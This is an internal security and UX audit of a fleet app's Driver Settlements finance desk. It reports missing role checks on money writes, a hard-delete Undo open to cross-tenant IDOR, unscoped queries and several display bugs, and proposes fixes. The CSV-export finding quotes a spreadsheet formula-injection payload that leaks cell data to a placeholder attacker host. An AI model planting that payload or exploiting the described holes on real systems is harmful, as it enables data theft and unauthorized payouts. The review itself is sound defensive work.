# Driver Settlements — Full Section Audit

**Scope**: Business Finance → Driver Settlements (Collect / Pay / Log cash / Reconciled), its API layer, its server projection queue, and the money-write path behind every button on the page.

**Date**: 2026-09-05
**Reviewed as**: systems architect + UI/UX + senior application/security review
**Mode**: **Audit only — no code was changed.**

**Related prior audits** (read alongside; this one does *not* repeat their findings):
- [SETTLEMENT_CALCULATION_AUDIT.md](SETTLEMENT_CALCULATION_AUDIT.md) — the settlement *formula* and the period rebuild engine
- [docs/FINANCIAL_INTEGRITY_AUDIT.md](docs/FINANCIAL_INTEGRITY_AUDIT.md) — the seven money engines and the four week rules
- [docs/adr/0010-collect-kpi-basis.md](docs/adr/0010-collect-kpi-basis.md) — why "Driver owes" and "Cash held" are separate KPIs

This audit covers what those two do not: **the desk itself** — its queues, its controls, its authorization, its UX, and whether it is structurally fit to be the place a fleet moves real money.

---

## 0. Executive verdict

The settlement **math** is in good shape. `packages/finance-core` computes in integer minor units, the formula is continuous across zero, and the projection table (`driver_financial_periods`) is a real read model. That work has been done and it holds up.

The **desk built on top of it has not caught up.** It is a 2,342-line single component that:

- writes money through an endpoint that **enforces no role permission at all** for settlement categories,
- "undoes" a payout by **hard-deleting the financial record** with no reversing entry, no reason, no actor, and no organization check,
- serves the Reconciled tab **without organization scoping**,
- silently ignores the service-line scope switcher on three of its four queues,
- reads *two different sources of truth* (SQL projections for Outstanding, raw KV transactions for Awaiting/Done) and cannot reconcile them,
- has **zero tests**.

On the screenshot supplied: $228,160.87 of driver debt and $298,185.80 of held cash are being managed through a screen with no aging, no driver-level rollup, no on-screen total, no approval step, no idempotency, and an Undo button that destroys evidence. The numbers are probably right. The **controls around them are not enterprise-grade**, and that is the actual gap.

**Verdict**: the calculation layer is keepable and should be preserved as-is. The desk layer — component, queue API, write path, and authorization — needs a rebuild. Estimated 4–6 weeks of focused work, sequenced in §6 so that the two Severity-1 security items ship in week one.

---

## 1. What the section actually is today

### 1.1 Surface map

```
Business Finance → Driver Settlements          apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx (2,342 lines)
│
├── 5 KPI cards ─────── Driver owes (settled) · Cash held (not finalized) · Fleet owes
│                       Awaiting bank clear · Cleared this week
│
├── 4 mode buttons ──── Collect │ Pay │ Log cash │ Reconciled       (DeskMode)
│
├── Filter bar ──────── Week from · Week to · Min amount · Search   (rendered TWICE — see H-31)
│
└── 3 tabs (Collect/Pay only) ── Outstanding │ Awaiting clear │ Done
```

### 1.2 Data flow — and the seam that runs through it

```
                     ┌──────────────────────────────────────────────┐
                     │  driver_financial_periods  (SQL read model)  │
                     │  rebuilt by rebuildDriverFinancialPeriod()   │
                     └──────────────────────────────────────────────┘
                             │             │            │
      GET /company-owes ─────┘             │            └───── GET /reconciled
      GET /driver-owes ────────────────────┘                   GET /cash-held
                             │
                             ▼
                  Outstanding tab · all 3 debt KPIs           ← SOURCE OF TRUTH A
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
                  Awaiting clear tab · Done tab               ← SOURCE OF TRUTH B
                             ▲
                             │
      GET /transactions?desk=settlements&startDate&endDate
                             │
                     ┌──────────────────────────────────────────────┐
                     │  kv_store  transaction:*  (raw ledger rows)  │
                     └──────────────────────────────────────────────┘
```

**Every write goes to B. Every balance is read from A.** They are reconciled by an outbox + rebuild, asynchronously, with no drift detector on this screen. The user sees them side by side in one tab strip and has no way to tell when they disagree.

### 1.3 Write paths

| Action | Builder | Endpoint | Role check |
|---|---|---|---|
| Log Cash | `buildCashCollectionTx` | `POST /transactions` | **none** (see S1-1) |
| Pay | `buildDriverPayoutTx` | `POST /transactions` | **none** |
| Write Off | `buildCashWriteOffTx` | `POST /transactions` | **none** |
| Verify | `saveTransaction({...tx, status:'Verified'})` | `POST /transactions` | **none** |
| Undo | `deleteTransaction(id)` | `DELETE /transactions/:id` | `transactions.edit` **, no org check** |
| Batch | loop over the above, N sequential POSTs | `POST /transactions` ×N | **none** |

All money-shaping logic — amount, sign, category, status, week tag — is **authored in the browser**. The server stores what it is handed.

### 1.4 File inventory

| Layer | File | Lines |
|---|---|---|
| Page | `apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx` | 2,342 |
| Overlay | `apps/fleet/src/components/fleet-financials/ReconciledPeriodOverlay.tsx` | 480 |
| Modals | `RecordPayoutModal` / `LogCashPaymentModal` / `CashWriteOffModal` | 245 / 535 / 208 |
| Tx builders | `apps/fleet/src/utils/driverSettlementTx.ts` | ~190 |
| Small utils | `driverSettlementsPayAmount.ts` / `settlementDeskUx.ts` | 10 / 21 |
| API client | `apps/fleet/src/services/api.ts` (5 methods, 2527–2644) | ~120 |
| Route layer | `supabase/functions/_fleet-server/driver_financial_period_controller.tsx` | 737 |
| Projection | `supabase/functions/_fleet-server/driver_financial_periods.ts` | 2,291 |
| Math core | `packages/finance-core/*` | — |
| **Tests for the desk** | — | **0** |

---

## 2. Severity 1 — Security, control, and wrong numbers on screen

### S1-1 🔴 The money-write endpoint enforces no role permission for settlement categories

**Evidence.** `POST /make-server-37f42386/transactions` is registered with `requireAuth()` only — [index.tsx:3415](supabase/functions/_fleet-server/index.tsx#L3415). `requireAuth()` verifies a Supabase JWT and **asserts no role** ([rbac_middleware.ts:360](supabase/functions/_fleet-server/rbac_middleware.ts#L360)).

Inside the handler there are exactly two `transactions.edit` gates:
1. `category === "InDrive Wallet Credit"` — [index.tsx:3451](supabase/functions/_fleet-server/index.tsx#L3451)
2. `if (genericTransactionPreview || isCashRetag)` — [index.tsx:3502](supabase/functions/_fleet-server/index.tsx#L3502)

Gate 2 fires only when `buildCanonicalGenericTransactionEvent()` returns non-null, which requires `classifyPostedBusinessTransaction()` to match a category. That classifier's category sets are:

```
EXPENSE_CATEGORIES: insurance, registration, cash collection fees, bank charges,
                    office expenses, software/subscription, marketing,
                    vehicle payment, supplier payment, tax payment, other expenses
INCOME_CATEGORIES:  surge pricing, bonuses, other income
```
— [businessTransactionAccounting.ts:11-29](apps/fleet/src/utils/businessTransactionAccounting.ts#L11-L29)

`Driver Payouts`, `Cash Collection`, and `Cash Write Off` are in **neither set**. The classifier returns `null`, the preview is `null`, and **the permission check is skipped.**

**Impact.** Any principal holding a valid JWT for this Supabase project can `POST` a `Driver Payouts` transaction of arbitrary amount, tagged to any driver and any settlement week. That write is immediately consumed by `rebuildFinancialPeriodsForCashTx` and moves `settlement_paid` on the projection — i.e. it **discharges a real fleet liability** with no role check. A read-only auditor account, a suspended manager whose role was downgraded but whose token is still valid, or a driver-app token all pass this gate.

**Fix.** Add `requirePermission('transactions.edit')` to the route, or an explicit category allowlist gate before the KV write covering the settlement categories. Then add a negative test per category.

---

### S1-2 🔴 "Undo" hard-deletes a financial record — no reversal, no reason, no actor, no org check

**Evidence.** [index.tsx:3982-4012](supabase/functions/_fleet-server/index.tsx#L3982-L4012):

```ts
const tx = await kv.get(`transaction:${id}`);
...
await kv.del(`transaction:${id}`);           // ← the record is gone
await deleteCanonicalLedgerBySource("transaction", [id]);
await rebuildFinancialPeriodsForCashTx(tx, null);
```

The row is deleted. No tombstone, no `voided_at`, no reversing entry, no `deletedBy`, no reason string. The UI confirm dialog collects nothing beyond "Undo" — [DriverSettlementsPage.tsx:1510-1549](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1510-L1549).

Three separate defects compound here:

**(a) Destroyed audit trail.** A $28,019.24 payout can be erased and leave no evidence it ever existed. There is no way to answer "who reversed this and why" — the only trace is a projection that silently moved. This fails basic financial-records practice and any external audit.

**(b) No organization check.** The handler fetches `transaction:${id}` and deletes it without ever comparing the record's `organizationId` to the caller's org. `requireAuth()` is used without `requireOrg`. **Any user with `transactions.edit` in any tenant can delete any transaction in any other tenant by guessing or leaking an id.** This is a direct IDOR on financial records.

**(c) Over-broad permission.** `transactions.edit` — the same permission needed to log a routine cash collection — authorizes destroying a settled payout.

**Fix.**
- Never delete. Post a **reversing transaction** (`type: 'Payout_Reversal'`, negative amount, `reversesTransactionId`, mandatory `reason`, `reversedBy`). The projection already nets by week; a reversal is arithmetically equivalent and evidentially superior.
- Add an org-ownership assertion before any mutation by id.
- Gate reversal behind a distinct permission (`transactions.reverse`) with an amount threshold requiring a second approver.

---

### S1-3 🔴 The Reconciled tab is served without organization scoping

**Evidence.** `listReconciledSettlementPeriods` accepts `organizationId` and applies it — [driver_financial_periods.ts:1972-1974](supabase/functions/_fleet-server/driver_financial_periods.ts#L1972-L1974). The route **never passes it**:

```ts
// driver_financial_period_controller.tsx:342-347
const rows = await listReconciledSettlementPeriods({
  periodStart: opts.periodStart,
  periodEnd: opts.periodEnd,
  minAmount: opts.minAmount,
  limit: opts.limit ?? 500,
});                                   // ← opts.organizationId dropped
```

`queueListQuery()` computed `organizationId` two lines earlier and it is discarded. Compare `/company-owes`, which spreads `...opts` and is correctly scoped.

**Impact.** Every settled week for **every tenant** — gross earnings, driver share, fleet share, tips, net payout, driver names — is returned to any user with `transactions.view` in any org, up to 2,000 rows. This is a cross-tenant data disclosure on the most commercially sensitive table in the product.

`listRecentlyPaidSettlementPeriods` has the same shape and doesn't even accept `organizationId` — [driver_financial_periods.ts:1885-1889](supabase/functions/_fleet-server/driver_financial_periods.ts#L1885-L1889).

**Fix.** Pass `organizationId` on both routes. Then stop relying on hand-threading: add an RLS policy on `driver_financial_periods` keyed to `organization_id`, so a dropped parameter degrades to "no rows" rather than "all tenants". Note that [FINANCIAL_INTEGRITY_AUDIT §2.4](docs/FINANCIAL_INTEGRITY_AUDIT.md) already flagged that this column is inconsistently written — that must be fixed first or the RLS policy will hide legitimate rows.

---

### S1-4 🔴 No server-side settlement validation, no idempotency — duplicate and over-payment are one double-click away

**Evidence.** The entire correctness envelope for a payout lives in the browser:

- amount cap: `RecordPayoutModal` — `if (parsed > cap) toast.error(...)` ([RecordPayoutModal.tsx:96](apps/fleet/src/components/drivers/RecordPayoutModal.tsx#L96))
- write-off cap: `saveWriteOff` — client-side throw ([DriverSettlementsPage.tsx:957-961](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L957-L961))

The server applies **neither**. `POST /transactions` performs no check that `settlement_paid + amount ≤ gross entitlement` for the tagged week.

There is also **no idempotency key** on any settlement transaction. Contrast `settlementService.commitWeeklyStatement`, which does this correctly for fuel via `enterpriseFuelSyncIdempotencyKey` ([settlementService.ts:265](apps/fleet/src/services/settlementService.ts#L265)) — the settlement desk has no equivalent.

**Impact.**
- **Duplicate payouts.** A POST that succeeds server-side but fails to return (timeout, dropped connection, `fetchWithRetry` retry) creates a second payout on retry. `runBatch` amplifies this across every selected row.
- **Concurrent over-payment.** Two operators open the same week and both click Pay. Both reads saw the same residual; both writes land. The fleet pays twice. The only consequence is a lilac "Overpaid" **badge** appearing afterwards — a *reporting* flag, per `overpaidAmount` in [driverPeriodSettlement.ts](packages/finance-core/src/driverPeriodSettlement.ts), not a control.
- **Retroactive breach.** Nothing stops a payout tagged to a week whose entitlement later shrinks.

**Fix.** Move the invariant server-side. Every settlement write becomes a command (`POST /settlements/:driverId/:weekAnchor/pay`) carrying a client-generated `idempotencyKey` and the `expectedResidual` the operator saw. The server re-derives the residual under a row lock, rejects on mismatch (`409 STALE_RESIDUAL`), and dedupes on the key. This single change closes duplicate, over-payment, and stale-read at once.

---

### S1-5 🔴 Log Cash has no over-collection cap — the only uncapped money control on the desk

**Evidence.** `RecordPayoutModal` caps at `maxAmount` and disables submit below the epsilon; `CashWriteOffModal` does the same ([CashWriteOffModal.tsx:83](apps/fleet/src/components/drivers/CashWriteOffModal.tsx#L83), [:191](apps/fleet/src/components/drivers/CashWriteOffModal.tsx#L191)). `LogCashPaymentModal` validates only that the amount is positive, that a week is selected, and that non-cash methods carry a reference ([LogCashPaymentModal.tsx:193-204](apps/fleet/src/components/drivers/LogCashPaymentModal.tsx#L193-L204)). `cashOwed` is displayed as a figure ([:299](apps/fleet/src/components/drivers/LogCashPaymentModal.tsx#L299)) and never compared against the entry.

**Impact.** An operator can log $50,000 collected against a week owing $2,000 — no warning, no confirmation. The week flips to a large negative cash balance, the projection turns it into a `company_owes` residual, and the fleet now shows a liability it does not have. Because this is the highest-volume action on the desk, a fat-finger here is likely, not hypothetical.

**Fix.** Symmetry with the other two modals: soft-warn above `cashOwed`, hard-block above a configurable tolerance, and require a reason + a second approval for a deliberate over-collection.

---

### S1-6 🟠 The service-line scope switcher is a silent no-op on three of four queues

**Evidence.** The page threads `serviceLine` into `rangeOpts` ([DriverSettlementsPage.tsx:315-321](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L315-L321)). Following it:

| Queue | Client sends? | Controller forwards? | Query function honours? |
|---|---|---|---|
| company-owes (Pay) | yes | yes (`...opts`) | **yes** — [:1878](supabase/functions/_fleet-server/driver_financial_periods.ts#L1878) |
| driver-owes (Collect) | yes | yes | **no** — no `serviceLine` in the signature ([:2056](supabase/functions/_fleet-server/driver_financial_periods.ts#L2056)) |
| cash-held (Collect) | yes | yes | **no** — [:2101](supabase/functions/_fleet-server/driver_financial_periods.ts#L2101) |
| reconciled | no (`getReconciledPeriods` has no such param) | no | supports `organizationId` only |
| transactions (Awaiting/Done) | no — key is `[weekFrom, weekTo]` only ([:420](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L420)) | n/a | n/a |

**Impact.** Switch the global scope to Rideshare and the **Pay** tab correctly narrows while **Collect**, **Reconciled**, **Awaiting** and **Done** keep showing Rush rows. The desk presents itself as scoped and is not. Any operator reconciling one service line against these totals will be wrong, and will have no indication of it.

**Fix.** Either honour `serviceLine` on all five reads, or — better — remove the parameter from the three that ignore it and show an explicit "scope not supported on this queue" affordance until it is implemented. Silent partial filtering is worse than no filtering.

---

### S1-7 🟠 The post-collection toast reports a fabricated number

**Evidence.** After a cash collection the page tries to read the freshly refetched row:

```ts
// DriverSettlementsPage.tsx:652-664
const owes = qc.getQueryData<{rows: PeriodRow[]}>(['driverOwesPeriods', weekFrom, weekTo, minAmount]);
```

The actual query key is `['driverOwesPeriods', weekFrom, weekTo, minAmount, scope]` ([:340](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L340)). React Query keys match structurally — a 4-element key **never** matches a 5-element entry. `findFreshCollectRow` therefore always returns `undefined`, and the toast silently falls back to client arithmetic:

```ts
const afterAmt = fresh ? collectAmount(fresh) : Math.max(0, beforeAmt - Math.abs(payment.amount));
```

**Impact.** The toast reads `owed $9,300.00 → $7,300.00 (changed by $2,000.00)`. That is subtraction, not the server's answer. If the server applied a toll wash, a fuel credit, a partial clamp, or rejected part of the payment, the operator is told the wrong new balance and is given no reason to look further. This defeats the entire purpose of the "changed by" confirmation, which exists precisely to catch the case where the server disagrees.

**Fix.** Add `scope` to the lookup key — or better, have the write command return the recomputed row and display the server's value, never a locally derived one.

---

### S1-8 🟠 The Reconciled query key omits `scope` — stale data across scope switches

**Evidence.** [DriverSettlementsPage.tsx:375](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L375) — `queryKey: ['reconciledPeriods', weekFrom, weekTo, minAmount]`. The other three period queries include `scope`.

**Impact.** Compounding S1-6: even once `serviceLine` is honoured on the reconciled endpoint, the cache will serve the previous scope's rows. Cache keys must include every input that changes the response.

---

### S1-9 🟠 Cash-held rows can never show a cash mismatch or overpaid flag

**Evidence.** `listCashHeldPeriods` selects:

```
driver_id, period_anchor, period_end, settlement_amount, settlement_paid,
cash_collected, cash_returned, cash_still_held, payout_net,
settlement_status, fuel_finalized, trip_count
```
— [driver_financial_periods.ts:2112-2114](supabase/functions/_fleet-server/driver_financial_periods.ts#L2112-L2114). **No `metadata` column.**

It then maps through `mapPeriodListRow`, whose only job for these fields is:

```ts
const mismatch = Number(r.metadata?.financeCore?.cashSourceMismatch);
```
— [:2037](supabase/functions/_fleet-server/driver_financial_periods.ts#L2037)

`r.metadata` is `undefined`, so `cashSourceMismatch` is always `0`. Same for the `overpaidAmount` the Collect desk reads.

**Impact.** The Collect queue merges driver-owes and cash-held rows into one table. Half of them can display the amber "Cash mismatch −$4,553.13" warning ([:1738-1742](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1738-L1742)); the other half are structurally incapable of it. The warning's **absence is meaningless**, but the operator cannot tell which rows are which. This is a warning system that fails silent on the queue where cash discrepancies are most likely — pre-finalize weeks.

**Fix.** Add `metadata` to the select. Then add a test asserting that every list query selects every column its mapper reads — this class of bug will recur otherwise.

---

### S1-10 🟠 The Done tab loses payments recorded outside the week window

**Evidence.** Transactions are fetched by **transaction date**:

```ts
await api.getTransactions(undefined, { limit, offset, startDate: weekFrom, endDate: weekTo, desk: 'settlements' });
```
— [:426-432](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L426-L432)

but are then filtered and grouped by **settlement week** (`metadata.workPeriodStart`) — [:582-588](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L582-L588). The server comment at [index.tsx:3110](supabase/functions/_fleet-server/index.tsx#L3110) states the desk sends the range so Done isn't clamped — but the range is applied to the wrong axis.

**Impact.** A payout recorded on 20 Sep for settlement week 31 Aug – 6 Sep is never fetched when the filter reads 1 Jan → 6 Sep. It **does** reduce the Outstanding residual (the projection uses the week tag). So the money is deducted from what's owed and appears **nowhere** in the desk's Done or Awaiting evidence. Late-recorded and catch-up payments — exactly the ones an operator most needs to verify — are the ones that vanish. Given the screenshot shows weeks going back to January, this affects a large share of the real data set.

**Fix.** Filter server-side on `metadata.workPeriodStart` for `desk=settlements` (indexing that key if needed), or fetch a widened date envelope and filter by week client-side. The two axes must not be conflated.

---

### S1-11 🟡 The KPI row mixes bases, respects filters inconsistently, and changes meaning with mode

**Evidence.** [:621-646](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L621-L646):

| KPI | Source | Search filter applied? | Mode-dependent? |
|---|---|---|---|
| Driver owes (settled) | `driverOwesQuery.data.rows` — raw | **no** | no |
| Cash held (not finalized) | `cashHeldQuery.data.rows` — raw | **no** | no |
| Fleet owes | `payOutstanding` — **filtered** | **yes** | no |
| Awaiting bank clear | `awaitingRows` | yes | **yes** — flips Collect/Pay |
| Cleared this week | tx since Monday | no | **yes** |

**Impact.** Typing a driver's name into Search narrows exactly one of five KPIs. Clicking Collect vs Pay changes two more. Nothing on screen says so. An operator screenshotting this row for a report captures five numbers on three different bases, one of which reflects a search box they have since cleared.

Additionally, "Cleared this week" counts transactions dated since Monday **from within the fetched window only** — narrow the range to exclude the current week and it reads `$0.00`, which is indistinguishable from "nothing cleared". The screenshot's `$0.00` may be either.

**Fix.** One rule, stated in the UI: KPIs describe the **unfiltered** period range; the table describes the filtered subset. Show a separate "showing N of M · $X of $Y" line above the table. Never let a KPI silently depend on mode — split them or label them.

---

### S1-12 🟡 CSV export is vulnerable to formula injection and breaks on commas in ids

**Evidence.** [:852-896](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L852-L896):

```ts
r.driverId,                                                    // ← never quoted
`"${String(r.driverName || '').replace(/"/g, '""')}"`,          // ← quoted, not neutralised
```

**Impact.** A driver name beginning `=`, `+`, `-`, `@`, tab, or CR is interpreted as a formula by Excel, Google Sheets, and LibreOffice on open. Since driver names are operator-entered (and, via signup, partly self-entered), `=HYPERLINK("http://attacker/"&A1,"Click")` in a name field becomes a live payload in a finance export that will be opened by a finance team. `driverId` is emitted unquoted and will corrupt the row if it ever contains a comma.

**Fix.** Quote every field. Prefix any cell whose first character is in `=+-@\t\r` with a single quote or a leading `'`. Emit a UTF-8 BOM so accented names don't mojibake in Excel. Move export server-side once volumes exceed the row cap (see S2-3).

---

## 3. Severity 2 — Structural: this will keep producing bugs

### S2-1 Two sources of truth in one tab strip, with no drift detection

Outstanding and the debt KPIs read `driver_financial_periods` (SQL projection). Awaiting and Done read `transaction:*` (KV). They are joined only by the `metadata.workPeriodStart` string, reconciled asynchronously by an outbox, and **never compared on screen**.

Consequences already visible in this audit: S1-10 (money in one and not the other), S1-9 (a field that exists in one and not the other), and the fact that "Done" totals and "Outstanding" residuals cannot be footed against each other by any user action.

**Fix.** One read model. Extend `driver_financial_periods` (or a companion `settlement_movements` view) to carry the movement rows for a week — collected, paid, written off, pending — so all four tabs read one projection. Keep KV as the event store, never as a query source for this desk.

### S2-2 The write path is authored client-side

`buildCashCollectionTx`, `buildDriverPayoutTx`, `buildCashWriteOffTx` decide amount sign, `type`, `category`, `status`, `isReconciled`, and the week tag — in the browser ([driverSettlementTx.ts](apps/fleet/src/utils/driverSettlementTx.ts)). The server persists the payload. Every invariant is therefore advisory; see S1-1, S1-4, S1-5.

**Fix.** Replace the three builders with three server commands. The client sends intent (`driverId`, `weekAnchor`, `amount`, `method`, `reference`, `reason`, `idempotencyKey`); the server constructs the record. This is the single highest-leverage structural change in this document.

### S2-3 Client-side pagination of up to 50,000 transactions on every page visit

```ts
while (offset < 50000) {
  const page = await api.getTransactions(undefined, { limit: 5000, offset, ... });
  ...
}
```
— [:425-437](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L425-L437)

Up to **ten sequential round trips** of 5,000 org-wide transactions each, on mount, blocking Awaiting/Done. All filtering, grouping, and totalling then happens in JavaScript. At current volumes (16 weeks × N drivers) this is already slow; at 100 drivers × 52 weeks it will not complete.

Similarly, period queries request `limit: 1000` ([:319](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L319)) and render every row into a plain `<table>` — no virtualization, no pagination, no server-side sort. There is no indication when the cap truncates the result: 1,000 rows and 1,001 rows look identical.

**Fix.** Server-side pagination, filtering, sorting, and aggregation. The client should request a page, not a corpus. Return an explicit `totalCount` and `truncated` flag and render them.

### S2-4 Floats in the UI while the core computes in minor units

`finance-core` is careful — `computePeriodSettlementMinor` works in integer cents and converts only at the boundary. The desk then does all of its arithmetic in JS floats: `settledOwesTotal`, `cashHeldKpiTotal`, `fleetOwesTotal`, `awaitingTotal`, `clearedThisWeek`, `selectedTotal`, `g.total`, and the batch amounts, with ad-hoc `Math.round(x * 100) / 100` in some paths and not others. Epsilons are scattered as the literal `0.005` in nine places on this page alone.

**Fix.** Transport minor units to the client and keep them minor until format time. Export the epsilons from `finance-core` (`MONEY_EPS` already exists and is not used here).

### S2-5 No optimistic concurrency on the money row

Already flagged as A-6 in [SETTLEMENT_CALCULATION_AUDIT.md](SETTLEMENT_CALCULATION_AUDIT.md) and still open. There is no version column, no `If-Match`, no compare-and-set. Combined with S1-4 this is the mechanism behind concurrent over-payment.

### S2-6 No week-level locking during a pay run

`runBatch` iterates rows sequentially with no lock ([:1003-1041](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1003-L1041)). Nothing prevents a second operator from paying row 7 while the batch is on row 3. Nothing prevents the nightly rebuild from restating a week mid-batch.

**Fix.** A `settlement_run` entity: created, locks its weeks, executes server-side, reports per-row outcome, is auditable and re-runnable. This also gives you the batch-failure detail missing in S3-6.

### S2-7 Edge functions import from `apps/fleet/src/`

```ts
// supabase/functions/_fleet-server/canonical_from_ops.ts:9
import { classifyPostedBusinessTransaction } from "../../../apps/fleet/src/utils/businessTransactionAccounting.ts";
```

and in the other direction:

```ts
// apps/fleet/src/utils/periodTollCashSpend.ts
export { isCashPaidTollRow } from '../../../../packages/finance-core/src/periodTollCashSpend.ts';
```

Both cross a package boundary by relative path. This is A-9 from the prior audit, still open, and it is what allowed S1-1: a permission decision in the edge function depends on a category list that lives in a frontend utility, where nobody reviewing the frontend knows it gates authorization.

**Fix.** Anything shared moves into `packages/finance-core` (or a peer). Nothing in `supabase/functions/**` may reference `apps/**`; add a lint rule.

### S2-8 A 2,342-line component with no tests

All state, all queries, all mutations, all five table components, and all four modals' wiring live in one file with 25 `useState` hooks. `grep -rln "DriverSettlementsPage" apps/fleet/src e2e` returns only the file itself, its deprecated alias, and `App.tsx`. **There is no test — unit, integration, or e2e — covering any behaviour on this screen**, including the money-moving paths.

This is the root cause of most of §2 and §4: nothing here can be changed with confidence, so defects accrete rather than get fixed.

### S2-9 Selection state is not reconciled against server truth

`selected` holds `driverId|periodAnchor` strings. It is cleared on tab/mode/range/search change ([:648-650](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L648-L650)) but **not** on refetch. `selectedRows` is derived by intersecting with the current rows, so a row that disappears between selection and batch execution is silently dropped — the operator sees "Collect selected (12)" and gets 9 collections with no explanation. `toggleSelectAll` also selects only loaded rows while the header suggests "all".

---

## 4. Severity 3 — UX and operator experience

The screenshot tells the story: sixteen rows, all the same driver, ordered by week, each a separate line item requiring a separate decision. This is a **ledger dump, not a work queue.**

### S3-1 No driver-level rollup
The primary unit of work is "settle up with Kenny", not "settle week 12 of 16 with Kenny". The desk should default to one row per driver — total owed, oldest debt, week count, trend — expanding to weeks on demand. Sixteen rows per driver × N drivers is unusable past a handful of drivers.

### S3-2 No aging
A $9,300 debt from last week renders identically to a $3,976 debt from May. Aging is *the* primary signal in every receivables system. Add 0–30 / 31–60 / 61–90 / 90+ buckets, colour by age, and sort by age by default.

### S3-3 No on-screen total
The table has no footer. Nothing sums what is currently displayed. The operator must trust that a KPI computed on a different basis (S1-11) describes the rows in front of them.

### S3-4 `Min amount` defaults to `1` and hides balances silently
[:243](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L243) — every sub-$1 balance is excluded by default, from the table *and* from the KPIs, with only a placeholder hint. Small residuals are exactly what accumulates into unexplained drift.

### S3-5 Failed fetches render as legitimate zeros
There is no `isError` handling on any of the five queries. A 500 on `/driver-owes` produces `rows: []` → the KPI shows `$0.00` and the table shows "No outstanding collections in this range." **An outage is indistinguishable from a clean slate.** (This mirrors finding 1.10 in the Financial Integrity Audit — the same pattern, unfixed here.)

### S3-6 Batch reports counts, not outcomes
```ts
try { ...; ok++ } catch { fail++ }
```
— [:1037-1040](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1037-L1040). Errors are swallowed entirely. `3 failed` is the whole report: no rows, no reasons, no retry. With no idempotency (S1-4), the operator's only recourse — re-run — risks duplicating the 9 that succeeded.

### S3-7 The Reconciled table is 13 columns wide with no controls
No column chooser, no horizontal scroll container, no sticky header, no density toggle, no per-column sort. It will overflow the page body on any laptop.

### S3-8 No settlement history, notes, or attachments
There is no per-week timeline (accrued → paid → reversed → adjusted), no note field, no receipt/evidence attachment, and no remittance advice the driver can be sent. Disputes are handled outside the system entirely.

### S3-9 Undo captures no reason
The confirm dialog asks only "Undo?" — while `CashWriteOffModal` correctly requires a reason for a *smaller* action. The most destructive control on the page has the weakest ceremony.

### S3-10 Export is available only on the Outstanding tab
`exportCsv` is rendered under `deskTab === 'outstanding'` ([:1363](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1363)). Done and Reconciled — the tabs a finance team actually needs to export for close — have none.

### S3-11 Accessibility
- `ReconciledTable` rows are clickable `<TableRow>`s: no `role="button"`, no `tabIndex`, no keyboard activation — the drill-down is unreachable without a mouse.
- The select-all `Checkbox` has no indeterminate state; a partial selection displays as unchecked.
- KPI values are not in a live region; a screen reader gets no announcement when a collection changes them.
- Status is conveyed by badge colour with text, which is fine — but the amber "Cash mismatch" line is `text-[10px]`, below any reasonable minimum.
- `MONEY()` renders `—` for null and `$0.00` for zero; both are read identically out of context.

### S3-12 Mode/tab model is confusing
`DeskMode` is a 4-way (`collect | pay | log-cash | reconciled`), but `direction` collapses it to 2, and tabs only exist for two of the four modes. "Log cash" is a *mode* that renders the Collect table plus a driver picker — it is a shortcut, not a peer of Collect/Pay/Reconciled, and presenting it as one costs the user a mental model.

---

## 5. Severity 4 — Redundancy, dead code, hygiene

| # | Item | Location |
|---|---|---|
| H-1 | `isClearedDriverPayout` — `if (pm === 'cash' \|\| pm === '') { return cleared; } return cleared;` — identical branches, dead conditional | [driverCashPayment.ts](packages/finance-core/src/driverCashPayment.ts) |
| H-2 | `isClearedDriverCashPayment` — same dead branch, copy-pasted | same file |
| H-3 | `DriverPayoutsPage.tsx` — a 2-line deprecated re-export file | [DriverPayoutsPage.tsx](apps/fleet/src/components/fleet-financials/DriverPayoutsPage.tsx) |
| H-4 | `export const DriverPayoutsPage = DriverSettlementsPage` — a second deprecated alias for the same thing | [:1622](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1622) |
| H-5 | The four-field filter bar is written out **twice**, ~60 duplicated lines | [:1269-1312](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1269-L1312) and [:1329-1362](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1329-L1362) |
| H-6 | The week→name→date sort comparator is inlined **three times**, character-identical | [:538-546](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L538-L546), [:567-575](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L567-L575), [:596-604](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L596-L604) |
| H-7 | The `search.trim().toLowerCase()` + 3-field match predicate appears **five times** | `collectOutstanding`, `payOutstanding`, `awaitingRows`, `donePayRows`, `doneCollectRows`, `reconciledRows` |
| H-8 | `DonePayTable` and `DoneCollectTable` are ~95% identical (170 lines each) — differ by two column labels and a colour | [:1924](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L1924), [:2093](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L2093) |
| H-9 | The `Number.isFinite(Number(x)) ? Number(x) : 0` ternary appears **34 times** in two adjacent blocks | [:379-412](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L379-L412), [:741-806](apps/fleet/src/components/fleet-financials/DriverSettlementsPage.tsx#L741-L806) |
